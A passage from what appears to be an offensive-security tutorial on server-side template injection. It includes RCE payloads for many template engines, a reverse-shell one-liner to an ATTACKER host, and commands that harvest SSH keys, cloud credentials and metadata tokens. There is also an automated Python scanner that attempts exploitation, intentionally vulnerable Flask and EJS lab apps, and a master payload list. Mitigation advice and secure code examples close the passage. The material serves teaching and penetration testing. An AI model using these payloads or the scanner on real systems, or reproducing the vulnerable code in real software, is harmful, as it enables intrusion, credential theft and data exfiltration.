  p.StartInfo.UseShellExecute = false;
  p.Start();
  var output = p.StandardOutput.ReadToEnd();
}
@output

# Simplified RCE
@System.Diagnostics.Process.Start("cmd.exe", "/c whoami")

# Directory listing
@String.Join("\n", System.IO.Directory.GetFiles("C:\\"))

# Environment variables
@System.Environment.GetEnvironmentVariables()
```
::

---

## Go Template Engine Payloads

::code-group
```text [Go html/template & text/template]
# Detection
{{.}}

# text/template is more permissive than html/template
# html/template auto-escapes output

# Access data
{{.Name}}
{{.User.Email}}
{{.Config}}

# Iterate
{{range .Items}}{{.}}{{end}}

# Conditional
{{if .IsAdmin}}ADMIN{{end}}

# Call methods
{{.Method}}
{{.User.GetPassword}}

# Built-in functions
{{printf "%v" .}}
{{len .Items}}

# Define and call template
{{define "T1"}}INJECTED{{end}}{{template "T1"}}

# text/template — potential code execution depends on exposed functions
# If the application passes dangerous functions to the template:
{{.System "id"}}
{{call .Exec "id"}}
```
::

---

## Privilege Escalation via SSTI

::warning
SSTI provides one of the most direct paths from **web vulnerability to full RCE** — template engines execute within the application's runtime, giving immediate access to the operating system.
::

::tabs
  :::tabs-item{icon="i-lucide-layers" label="PrivEsc Chain"}

  | Step | Technique | Access Level |
  |------|-----------|-------------|
  | 1 | SSTI Detection (`{{7*7}}` → `49`) | Confirmed template injection |
  | 2 | Engine identification | Know which payloads to use |
  | 3 | Information disclosure | App config, secrets, environment vars |
  | 4 | File system read | `/etc/passwd`, source code, `.env` files |
  | 5 | Remote Code Execution | OS command execution as app user |
  | 6 | Reverse shell | Interactive system access |
  | 7 | Local privilege escalation | SUID, sudo, kernel exploits → root |
  | 8 | Credential harvesting | Database creds, API keys, SSH keys |
  | 9 | Lateral movement | Pivot to internal services |
  | 10 | Data exfiltration | Database dump, file download |

  ::code-group
  ```text [Step 3 — Information Disclosure]
  # Flask/Jinja2
  {{config}}
  # Output: SECRET_KEY, DATABASE_URI, API keys...

  {{config.__class__.__init__.__globals__['os'].environ}}
  # Output: All environment variables

  # FreeMarker
  ${"freemarker.template.utility.Execute"?new()("env")}
  # Output: All environment variables

  # EJS
  <%= JSON.stringify(process.env) %>
  # Output: All environment variables
  ```

  ```bash [Step 5-6 — RCE to Reverse Shell]
  # After confirming RCE, establish persistent access

  # Listener on attacker machine
  nc -lvnp 4444

  # Trigger via SSTI payload (Jinja2 example)
  {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read()}}
  ```

  ```bash [Step 7 — Local PrivEsc]
  # Once you have a shell as the application user:

  # System enumeration
  id && whoami && hostname
  uname -a && cat /etc/os-release

  # Sudo permissions
  sudo -l

  # SUID binaries
  find / -perm -4000 -type f 2>/dev/null

  # Writable cron jobs
  cat /etc/crontab
  ls -la /etc/cron*

  # Docker socket (container escape)
  ls -la /var/run/docker.sock

  # Credentials in app files
  cat .env
  cat config.py
  cat settings.py
  find / -name "*.conf" -o -name "*.cfg" -o -name ".env" 2>/dev/null | xargs grep -li "password\|secret\|key" 2>/dev/null
  ```

  ```bash [Step 8 — Credential Harvesting]
  # Database credentials from config
  cat /var/www/app/.env
  cat /opt/app/config/database.yml
  grep -r "password" /var/www/ --include="*.py" --include="*.js" --include="*.php" 2>/dev/null

  # SSH keys
  find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
  cat /root/.ssh/id_rsa
  cat /home/*/.ssh/id_rsa

  # Cloud credentials
  cat ~/.aws/credentials
  cat ~/.config/gcloud/credentials.db
  cat ~/.azure/accessTokens.json

  # Database dump
  mysqldump -u root -p'FOUND_PASSWORD' --all-databases > /tmp/dump.sql
  pg_dumpall -U postgres > /tmp/dump.sql
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-cloud" label="Cloud PrivEsc"}

  ::code-group
  ```text [AWS Metadata via SSTI]
  # Read AWS credentials from metadata service
  {{config.__class__.__init__.__globals__['os'].popen('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/').read()}}

  # Get specific role credentials
  {{config.__class__.__init__.__globals__['os'].popen('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME').read()}}

  # EJS equivalent
  <%= require('child_process').execSync('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/').toString() %>
  ```

  ```text [GCP Metadata via SSTI]
  {{config.__class__.__init__.__globals__['os'].popen('curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token').read()}}
  ```

  ```text [Azure Metadata via SSTI]
  {{config.__class__.__init__.__globals__['os'].popen('curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"').read()}}
  ```
  ::
  :::
::

---

## Automated Detection & Exploitation

::code-collapse

```python [ssti_scanner.py]
#!/usr/bin/env python3
"""
SSTI Scanner — Multi-Engine Detection & Exploitation
Identifies template engine and attempts RCE
For authorized penetration testing only
"""

import requests
import sys
import time
import re
import json
from urllib.parse import urlparse, parse_qs, urlencode
from dataclasses import dataclass, asdict
from typing import List, Optional, Dict, Tuple

@dataclass
class SSTIResult:
    engine: str
    payload: str
    expected: str
    actual: str
    vulnerable: bool
    rce_achieved: bool
    rce_output: str
    severity: str
    parameter: str

class SSTIScanner:

    DETECTION_PAYLOADS: List[Tuple[str, str, str]] = [
        # (payload, expected_output, engine_hint)
        ("{{7*7}}", "49", "jinja2/twig/nunjucks/pebble"),
        ("{{7*'7'}}", "7777777", "jinja2"),
        ("{{7*'7'}}", "49", "twig"),
        ("${7*7}", "49", "freemarker/mako/thymeleaf/groovy"),
        ("<%= 7*7 %>", "49", "erb/ejs"),
        ("#{7*7}", "49", "pug/jade"),
        ("{7*7}", "49", "smarty"),
        ("@(7*7)", "49", "razor"),
        ("${{7*7}}", "49", "velocity"),
        ("{{=7*7}}", "49", "angular/vue"),
    ]

    ENGINE_FINGERPRINTS = {
        "jinja2": [
            ("{{config}}", r"<Config|SECRET_KEY", "Config access"),
            ("{{self.__class__}}", r"class|TemplateReference", "Self class access"),
            ("{{request.application}}", r"Flask|Application", "Flask detected"),
            ("{{lipsum.__globals__}}", r"os|builtins", "Lipsum globals"),
        ],
        "twig": [
            ("{{_self.env}}", r"Twig|Environment", "Twig environment"),
            ("{{'test'|upper}}", "TEST", "Twig filter"),
            ("{{constant('PHP_VERSION')}}", r"\d+\.\d+", "PHP version via Twig"),
        ],
        "freemarker": [
            ("${.version}", r"\d+\.\d+", "FreeMarker version"),
            ("${.data_model}", r"model|data", "Data model access"),
        ],
        "mako": [
            ("${self.module.__file__}", r"\.py|template", "Mako module file"),
        ],
        "ejs": [
            ("<%= process.version %>", r"v\d+\.\d+", "Node.js version"),
            ("<%= process.platform %>", r"linux|darwin|win32", "Platform"),
        ],
        "erb": [
            ("<%= RUBY_VERSION %>", r"\d+\.\d+\.\d+", "Ruby version"),
            ("<%= RUBY_PLATFORM %>", r"x86|arm|linux", "Ruby platform"),
        ],
        "pug": [
            ("#{process.version}", r"v\d+\.\d+", "Node.js via Pug"),
        ],
        "smarty": [
            ("{$smarty.version}", r"\d+\.\d+", "Smarty version"),
        ],
    }

    RCE_PAYLOADS = {
        "jinja2": [
            "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
            "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
            "{{cycler.__init__.__globals__['os'].popen('{cmd}').read()}}",
            "{{url_for.__globals__['os'].popen('{cmd}').read()}}",
            "{{namespace.__init__.__globals__['os'].popen('{cmd}').read()}}",
        ],
        "twig": [
            "{{['{cmd}']|filter('system')}}",
            "{{['{cmd}']|filter('exec')}}",
            "{{['{cmd}']|filter('passthru')}}",
            "{{['{cmd}']|map('system')}}",
        ],
        "freemarker": [
            '${{\"freemarker.template.utility.Execute\"?new()(\"{cmd}\")}}',
        ],
        "mako": [
            "${{__import__('os').popen('{cmd}').read()}}",
        ],
        "ejs": [
            "<%= require('child_process').execSync('{cmd}').toString() %>",
            "<%= global.process.mainModule.require('child_process').execSync('{cmd}').toString() %>",
        ],
        "erb": [
            "<%= `{cmd}` %>",
            "<%= IO.popen('{cmd}').read %>",
            "<%= system('{cmd}') %>",
        ],
        "pug": [
            "#{{require('child_process').execSync('{cmd}').toString()}}",
        ],
        "nunjucks": [
            "{{{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('{cmd}').toString()\")()}}}}",
        ],
        "smarty": [
            "{{if system('{cmd}')}}{{/if}}",
            "{{if exec('{cmd}')}}{{/if}}",
        ],
        "razor": [
            "@System.Diagnostics.Process.Start(\"cmd.exe\", \"/c {cmd}\")",
        ],
    }

    def __init__(self, target_url, param=None, method='GET', data=None):
        self.target = target_url
        self.param = param
        self.method = method.upper()
        self.data = data or {}
        self.results: List[SSTIResult] = []
        self.detected_engine = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def inject(self, payload: str) -> Optional[requests.Response]:
        """Inject payload into the target parameter"""
        try:
            if self.method == 'GET':
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query, keep_blank_values=True)
                if self.param:
                    params[self.param] = [payload]
                else:
                    # Try to find injectable param
                    for key in params:
                        params[key] = [payload]
                        break
                new_query = urlencode(params, doseq=True)
                url = parsed._replace(query=new_query).geturl()
                return self.session.get(url, timeout=15)
            else:
                data = dict(self.data)
                if self.param:
                    data[self.param] = payload
                return self.session.post(self.target, data=data, timeout=15)
        except Exception as e:
            return None

    def detect(self):
        """Detect SSTI and identify template engine"""
        print(f"\n{'='*65}")
        print(f" SSTI Detection — {self.target}")
        print(f" Parameter: {self.param or 'auto-detect'}")
        print(f"{'='*65}\n")

        print("[*] Phase 1: Mathematical expression detection...")
        for payload, expected, engine_hint in self.DETECTION_PAYLOADS:
            resp = self.inject(payload)
            if resp is None:
                continue

            if expected in resp.text:
                print(f"    🔴 SSTI DETECTED! Payload: {payload} → {expected}")
                print(f"       Engine hint: {engine_hint}")

                result = SSTIResult(
                    engine=engine_hint,
                    payload=payload,
                    expected=expected,
                    actual=expected,
                    vulnerable=True,
                    rce_achieved=False,
                    rce_output="",
                    severity="critical",
                    parameter=self.param or "auto"
                )
                self.results.append(result)

                # Don't break — collect all successful payloads
            else:
                print(f"    🟢 {payload}: Not reflected as {expected}")

            time.sleep(0.3)

        if not any(r.vulnerable for r in self.results):
            print("\n    [-] No SSTI detected with standard payloads")
            return None

        # Phase 2: Engine fingerprinting
        print("\n[*] Phase 2: Engine fingerprinting...")
        for engine, fingerprints in self.ENGINE_FINGERPRINTS.items():
            for payload, pattern, description in fingerprints:
                resp = self.inject(payload)
                if resp is None:
                    continue

                if isinstance(pattern, str) and re.search(pattern, resp.text, re.IGNORECASE):
                    self.detected_engine = engine
                    print(f"    🎯 ENGINE IDENTIFIED: {engine}")
                    print(f"       Evidence: {description}")
                    print(f"       Payload: {payload}")
                    return engine

                time.sleep(0.2)

        # If no specific engine identified, use first detection hint
        if self.results:
            hint = self.results[0].engine
            # Parse primary engine from hint
            self.detected_engine = hint.split('/')[0]
            print(f"\n    [?] Best guess engine: {self.detected_engine}")
            return self.detected_engine

        return None

    def exploit_rce(self, cmd='id'):
        """Attempt RCE with engine-specific payloads"""
        if not self.detected_engine:
            print("[-] No engine detected. Run detect() first.")
            return None

        engine = self.detected_engine
        print(f"\n[*] Phase 3: RCE exploitation ({engine})...")
        print(f"    Command: {cmd}")

        payloads = self.RCE_PAYLOADS.get(engine, [])
        if not payloads:
            print(f"    [-] No RCE payloads for engine: {engine}")
            return None

        for payload_template in payloads:
            payload = payload_template.replace('{cmd}', cmd)
            resp = self.inject(payload)

            if resp is None:
                continue

            # Check for command output in response
            # Look for common command outputs
            output_patterns = [
                r'uid=\d+',           # id command
                r'root:',             # /etc/passwd
                r'www-data',          # common web user
                r'Linux|Darwin|Windows', # uname
            ]

            output_found = None
            for pattern in output_patterns:
                match = re.search(pattern, resp.text)
                if match:
                    # Extract likely command output
                    # Find the section around the match
                    start = max(0, match.start() - 50)
                    end = min(len(resp.text), match.end() + 200)
                    output_found = resp.text[start:end].strip()
                    break

            if output_found:
                print(f"    🔴 RCE ACHIEVED!")
                print(f"       Payload: {payload[:80]}...")
                print(f"       Output: {output_found[:200]}")

                result = SSTIResult(
                    engine=engine,
                    payload=payload,
                    expected="command output",
                    actual=output_found[:500],
                    vulnerable=True,
                    rce_achieved=True,
                    rce_output=output_found,
                    severity="critical",
                    parameter=self.param or "auto"
                )
                self.results.append(result)
                return output_found

            time.sleep(0.3)

        print(f"    [-] RCE payloads did not produce visible output")
        print(f"        (may need blind/OOB techniques)")
        return None

    def generate_report(self):
        """Generate scan report"""
        vulnerable = [r for r in self.results if r.vulnerable]
        rce = [r for r in self.results if r.rce_achieved]

        report = {
            "target": self.target,
            "parameter": self.param,
            "detected_engine": self.detected_engine,
            "total_tests": len(self.results),
            "vulnerabilities": len(vulnerable),
            "rce_achieved": len(rce) > 0,
            "results": [asdict(r) for r in self.results]
        }

        filename = "ssti_scan_report.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n{'='*65}")
        print(f" SSTI SCAN COMPLETE")
        print(f"{'='*65}")
        print(f" Target:          {self.target}")
        print(f" Engine:          {self.detected_engine or 'Unknown'}")
        print(f" SSTI Detected:   {'YES' if vulnerable else 'NO'}")
        print(f" RCE Achieved:    {'YES' if rce else 'NO'}")
        print(f" Report:          {filename}")

        if vulnerable:
            print(f"\n 🔴 FINDINGS:")
            for v in vulnerable:
                print(f"    [{v.engine}] {v.payload[:60]}")
                if v.rce_achieved:
                    print(f"      RCE Output: {v.rce_output[:100]}")

        print(f"{'='*65}")
        return report

    def run_all(self):
        """Execute full scan"""
        engine = self.detect()
        if engine:
            self.exploit_rce('id')
        return self.generate_report()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <parameter> [method]")
        print(f"Example: {sys.argv[0]} 'http://target.com/page?name=test' name GET")
        print(f"Example: {sys.argv[0]} 'http://target.com/submit' template POST")
        sys.exit(1)

    method = sys.argv[3] if len(sys.argv) > 3 else 'GET'

    scanner = SSTIScanner(
        target_url=sys.argv[1],
        param=sys.argv[2],
        method=method
    )
    scanner.run_all()
```

::

---

## Vulnerable Lab — Docker Compose

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # Python/Jinja2 vulnerable app
  jinja2-app:
    build:
      context: ./jinja2-app
      dockerfile: Dockerfile
    ports:
      - "8080:5000"
    environment:
      - FLASK_ENV=development
      - SECRET_KEY=super_secret_flask_key_2024!
      - DATABASE_URI=postgresql://admin:db_password@db:5432/app
      - AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
      - AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    networks:
      - lab-net
    restart: unless-stopped

  # Node.js/EJS vulnerable app
  ejs-app:
    build:
      context: ./ejs-app
      dockerfile: Dockerfile
    ports:
      - "8081:3000"
    environment:
      - NODE_ENV=development
      - API_KEY=sk_live_secret_api_key_xyz
    networks:
      - lab-net
    restart: unless-stopped

  # PHP/Twig vulnerable app
  twig-app:
    build:
      context: ./twig-app
      dockerfile: Dockerfile
    ports:
      - "8082:80"
    networks:
      - lab-net
    restart: unless-stopped

  # Java/FreeMarker vulnerable app
  freemarker-app:
    build:
      context: ./freemarker-app
      dockerfile: Dockerfile
    ports:
      - "8083:8080"
    networks:
      - lab-net
    restart: unless-stopped

  # Ruby/ERB vulnerable app
  erb-app:
    build:
      context: ./erb-app
      dockerfile: Dockerfile
    ports:
      - "8084:4567"
    networks:
      - lab-net
    restart: unless-stopped

  # Request proxy
  mitmproxy:
    image: mitmproxy/mitmproxy:latest
    ports:
      - "9090:8080"
      - "9091:8081"
    command: mitmweb --web-host 0.0.0.0 --listen-port 8080 --web-port 8081
    networks:
      - lab-net

networks:
  lab-net:
    driver: bridge
```

::

::code-collapse

```python [jinja2-app/app.py]
"""
VULNERABLE Flask/Jinja2 SSTI Lab
Intentionally vulnerable — FOR EDUCATIONAL USE ONLY
"""

from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'default_secret')
app.config['DATABASE_URI'] = os.environ.get('DATABASE_URI', 'sqlite:///app.db')

@app.route('/')
def index():
    return '''
    <h1>SSTI Lab — Jinja2/Flask</h1>
    <h3>Vulnerable Endpoints:</h3>
    <ul>
        <li>GET /hello?name=INPUT — Reflected template injection</li>
        <li>POST /render — Direct template rendering</li>
        <li>GET /profile?bio=INPUT — Profile bio injection</li>
        <li>POST /email — Email template injection</li>
        <li>GET /error?msg=INPUT — Error message injection</li>
        <li>GET /secure?name=INPUT — Secure example (for comparison)</li>
    </ul>
    <p><b>Warning:</b> This application is intentionally vulnerable.</p>
    '''

# 1. Basic SSTI — name parameter
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # VULNERABLE — User input in template string
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)

# 2. Direct template rendering
@app.route('/render', methods=['POST'])
def render():
    template = request.form.get('template', '')
    # VULNERABLE — User-supplied template
    try:
        return render_template_string(template)
    except Exception as e:
        return f"<h1>Template Error</h1><pre>{e}</pre>"

# 3. Profile bio
@app.route('/profile')
def profile():
    bio = request.args.get('bio', 'No bio provided')
    # VULNERABLE — Bio in template
    template = f'''
    <h1>User Profile</h1>
    <div class="bio">
        <h3>About Me:</h3>
        <p>{bio}</p>
    </div>
    '''
    return render_template_string(template)

# 4. Email template preview
@app.route('/email', methods=['POST'])
def email_preview():
    subject = request.form.get('subject', 'No Subject')
    body = request.form.get('body', '')
    # VULNERABLE — Both fields injectable
    template = f'''
    <div style="border:1px solid #ccc;padding:20px;max-width:600px;">
        <h2>{subject}</h2>
        <hr>
        <p>{body}</p>
        <hr>
        <small>This is a preview of your email.</small>
    </div>
    '''
    return render_template_string(template)

# 5. Error page
@app.route('/error')
def error_page():
    msg = request.args.get('msg', 'Unknown error')
    # VULNERABLE — Error message in template
    template = f'''
    <h1>Error</h1>
    <div class="error" style="color:red;">
        <p>An error occurred: {msg}</p>
    </div>
    '''
    return render_template_string(template)

# SECURE EXAMPLE
@app.route('/secure')
def secure():
    name = request.args.get('name', 'World')
    # SECURE — User input passed as data, not in template string
    template = "<h1>Hello {{name}}!</h1>"
    return render_template_string(template, name=name)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

::

::code-collapse

```javascript [ejs-app/server.js]
/**
 * VULNERABLE EJS SSTI Lab
 * Intentionally vulnerable — FOR EDUCATIONAL USE ONLY
 */

const express = require('express');
const ejs = require('ejs');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. Greeting — SSTI in query parameter
app.get('/greet', (req, res) => {
  const name = req.query.name || 'World';
  // VULNERABLE — User input embedded in template
  const template = `<h1>Hello <%= '${name}' %>!</h1>`;
  try {
    const html = ejs.render(template);
    res.send(html);
  } catch (e) {
    res.status(500).send(`<pre>Error: ${e.message}</pre>`);
  }
});

// 2. Direct template rendering
app.post('/render', (req, res) => {
  const { template } = req.body;
  // VULNERABLE — User-supplied template
  try {
    const html = ejs.render(template);
    res.send(html);
  } catch (e) {
    res.status(500).send(`<pre>Error: ${e.message}</pre>`);
  }
});

// 3. Comment preview
app.get('/comment', (req, res) => {
  const comment = req.query.text || 'No comment';
  // VULNERABLE — Comment in template
  const template = `
    <div class="comment">
      <p>${comment}</p>
      <small>Posted just now</small>
    </div>
  `;
  try {
    res.send(ejs.render(template));
  } catch (e) {
    res.status(500).send(`<pre>Error: ${e.message}</pre>`);
  }
});

// SECURE example
app.get('/secure-greet', (req, res) => {
  const name = req.query.name || 'World';
  // SECURE — User input passed as data
  const template = '<h1>Hello <%= name %>!</h1>';
  const html = ejs.render(template, { name: name });
  res.send(html);
});

// Lab info
app.get('/', (req, res) => {
  res.json({
    lab: 'SSTI Lab — EJS/Node.js',
    endpoints: [
      'GET /greet?name=INPUT',
      'POST /render (body: template=INPUT)',
      'GET /comment?text=INPUT',
      'GET /secure-greet?name=INPUT (secure example)'
    ],
    note: 'Intentionally vulnerable. For educational use only.'
  });
});

app.listen(3000, () => {
  console.log('[*] EJS SSTI Lab running on port 3000');
});
```

::

---

## Comprehensive Payload Collection

::code-collapse

```text [ssti_master_payloads.txt]
# =====================================================
# SSTI — MASTER PAYLOAD COLLECTION
# For authorized penetration testing only
# =====================================================

# ===== DETECTION / PROBE PAYLOADS =====
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
@(7*7)
${{7*7}}
{{7*'7'}}
{{config}}
{{self}}
{{request}}
{{''.__class__}}
${T(java.lang.Runtime)}
<%= RUBY_VERSION %>
<%= process.version %>

# ===== JINJA2 (PYTHON/FLASK) =====

# Info disclosure
{{config}}
{{config.items()}}
{{config['SECRET_KEY']}}
{{request.environ}}
{{self.__class__.__mro__}}

# RCE via globals
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__['os'].popen('id').read()}}
{{joiner.__init__.__globals__['os'].popen('id').read()}}
{{namespace.__init__.__globals__['os'].popen('id').read()}}
{{url_for.__globals__['os'].popen('id').read()}}

# RCE via MRO chain
{{''.__class__.__mro__[1].__subclasses__()}}
# Find index X for os._wrap_close or similar
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['popen']('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# File read
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read()}}

# Sandbox bypasses
{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}
{{request|attr(request.args.c)}}  # ?c=__class__
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{config.__class__.__init__.__globals__['os'].popen(request.args.cmd).read()}}

# ===== TWIG (PHP) =====
{{7*7}}
{{_self.env}}
{{'test'|upper}}
{{constant('PHP_VERSION')}}
{{['id']|filter('system')}}
{{['id']|filter('exec')}}
{{['id']|filter('passthru')}}
{{['id']|map('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ===== FREEMARKER (JAVA) =====
${7*7}
${.version}
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ===== MAKO (PYTHON) =====
${7*7}
${__import__('os').popen('id').read()}
<%import os%>${os.popen('id').read()}

# ===== THYMELEAF (JAVA/SPRING) =====
${7*7}
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# ===== EJS (NODE.JS) =====
<%= 7*7 %>
<%= process.version %>
<%= require('child_process').execSync('id').toString() %>
<%= require('fs').readFileSync('/etc/passwd','utf-8') %>

# ===== PUG/JADE (NODE.JS) =====
#{7*7}
#{require('child_process').execSync('id').toString()}

# ===== NUNJUCKS (NODE.JS) =====
{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}

# ===== ERB (RUBY) =====
<%= 7*7 %>
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>

# ===== SMARTY (PHP) =====
{7*7}
{if system('id')}{/if}
{if phpinfo()}{/if}

# ===== RAZOR (.NET) =====
@(7*7)
@System.Diagnostics.Process.Start("cmd.exe", "/c whoami")
@System.IO.File.ReadAllText("/etc/passwd")

# ===== VELOCITY (JAVA) =====
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")

# ===== PEBBLE (JAVA) =====
{{7*7}}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray())}}

# ===== HANDLEBARS (NODE.JS) =====
{{this}}
{{constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}

# ===== GROOVY (JAVA) =====
${7*7}
${"id".execute().text}
${["id"].execute().text}
```

::

---

## Mitigation & Prevention

::card-group
  ::card
  ---
  title: Never Embed User Input in Templates
  icon: i-lucide-shield-check
  ---
  **The #1 rule**: Never concatenate user input into template strings. Always pass user data as **template variables/context** — `render_template("page.html", name=user_input)` not `render_template_string(f"Hello {user_input}")`.
  ::

  ::card
  ---
  title: Use Logic-Less Templates
  icon: i-lucide-file-minus
  ---
  Prefer logic-less template engines like **Mustache** or **Handlebars** (without helpers) that don't support arbitrary code execution. These engines intentionally limit what expressions can do.
  ::

  ::card
  ---
  title: Sandbox the Template Engine
  icon: i-lucide-box
  ---
  Enable sandbox mode where available — Jinja2's `SandboxedEnvironment`, Twig's sandbox extension. Restrict which functions, filters, and attributes are accessible from templates.
  ::

  ::card
  ---
  title: Input Validation & Sanitization
  icon: i-lucide-filter
  ---
  Validate and sanitize user input before any template processing. Strip or reject template syntax characters (`{{`, `}}`, `${`, `<%`, `%>`, `#{`). Apply strict allowlists for expected input formats.
  ::

  ::card
  ---
  title: Principle of Least Privilege
  icon: i-lucide-user-minus
  ---
  Run the application with minimum OS permissions. The template engine inherits the application's privileges — if the app runs as `root`, SSTI gives root access. Use dedicated low-privilege service accounts.
  ::

  ::card
  ---
  title: Static Template Files
  icon: i-lucide-file-lock
  ---
  Use pre-defined template files stored on disk rather than dynamically constructed template strings. Template files should be part of the application code, not user-controllable.
  ::
::

### Secure Code Examples

::code-group
```python [Python/Jinja2 — Secure]
from flask import Flask, render_template, render_template_string, request
from jinja2.sandbox import SandboxedEnvironment

app = Flask(__name__)

# ===== SECURE: Pass user input as template data =====
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # SECURE — name is passed as data, not part of template
    return render_template_string("<h1>Hello {{name}}!</h1>", name=name)

# ===== SECURE: Use template files =====
@app.route('/profile')
def profile():
    bio = request.args.get('bio', 'No bio')
    # SECURE — Template is a file, bio is data
    return render_template('profile.html', bio=bio)

# ===== SECURE: Sandboxed environment =====
@app.route('/render')
def safe_render():
    template_str = request.args.get('template', '')
    env = SandboxedEnvironment()
    try:
        template = env.from_string(template_str)
        return template.render()
    except Exception:
        return "Template error", 400

# ===== SECURE: Input validation =====
import re
@app.route('/message')
def message():
    msg = request.args.get('msg', '')
    # Strip all template syntax
    msg = re.sub(r'[{}\[\]<>%#$@!`]', '', msg)
    return render_template_string("<p>{{msg}}</p>", msg=msg)
```

```javascript [Node.js/EJS — Secure]
const express = require('express');
const ejs = require('ejs');
const app = express();

// SECURE — Pass user input as data
app.get('/greet', (req, res) => {
  const name = req.query.name || 'World';
  // Template is fixed, name is data
  const template = '<h1>Hello <%= name %>!</h1>';
  const html = ejs.render(template, { name: name });
  res.send(html);
});

// SECURE — Use template files
app.set('view engine', 'ejs');
app.get('/profile', (req, res) => {
  const bio = req.query.bio || 'No bio';
  // Template file, bio is data
  res.render('profile', { bio: bio });
});

// SECURE — Never render user-supplied templates
app.post('/render', (req, res) => {
  // REJECT — Don't render user-controlled templates
  res.status(400).json({ error: 'Template rendering not allowed' });
});
```

```java [Java/FreeMarker — Secure]
// SECURE — Use Configuration to restrict built-ins
Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);

// Disable dangerous built-ins
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);

// Or use allowlist
cfg.setNewBuiltinClassResolver(new TemplateClassResolver() {
    @Override
    public Class resolve(String className, Environment env, Template template) 
        throws TemplateException {
        throw new TemplateException("Class instantiation not allowed: " + className, env);
    }
});

// SECURE — Always use template files with data model
Map<String, Object> dataModel = new HashMap<>();
dataModel.put("name", userInput); // Data, not template code
Template template = cfg.getTemplate("hello.ftl"); // Fixed template file
template.process(dataModel, writer);
```

```php [PHP/Twig — Secure]
<?php
use Twig\Environment;
use Twig\Loader\FilesystemLoader;
use Twig\Extension\SandboxExtension;
use Twig\Sandbox\SecurityPolicy;

// SECURE — Sandbox configuration
$tags = ['if', 'for'];  // Only allow these tags
$filters = ['escape', 'upper', 'lower'];  // Only these filters
$methods = [];  // No method calls
$properties = [];  // No property access
$functions = [];  // No function calls

$policy = new SecurityPolicy($tags, $filters, $methods, $properties, $functions);
$sandbox = new SandboxExtension($policy, true);  // true = sandbox all templates

$loader = new FilesystemLoader('/path/to/templates');
$twig = new Environment($loader);
$twig->addExtension($sandbox);

// SECURE — Pass data, don't embed in template
echo $twig->render('hello.html.twig', ['name' => $userInput]);
?>
```
::

### Security Checklist

::field-group
  ::field{name="Template Construction" type="critical"}
  User input is NEVER concatenated into template strings. All user data is passed as template variables/context parameters.
  ::

  ::field{name="Template Files" type="critical"}
  Templates are stored as static files in the application codebase. No user-controllable template content is rendered.
  ::

  ::field{name="Sandbox Mode" type="high"}
  Template engine runs in sandboxed mode where available. Dangerous functions, classes, and modules are blocked.
  ::

  ::field{name="Input Validation" type="high"}
  All user input is validated and sanitized. Template syntax characters are stripped or rejected before any processing.
  ::

  ::field{name="Least Privilege" type="high"}
  Application runs as a low-privilege user. Template engine cannot access sensitive system files or execute privileged commands even if exploited.
  ::

  ::field{name="Content Security Policy" type="medium"}
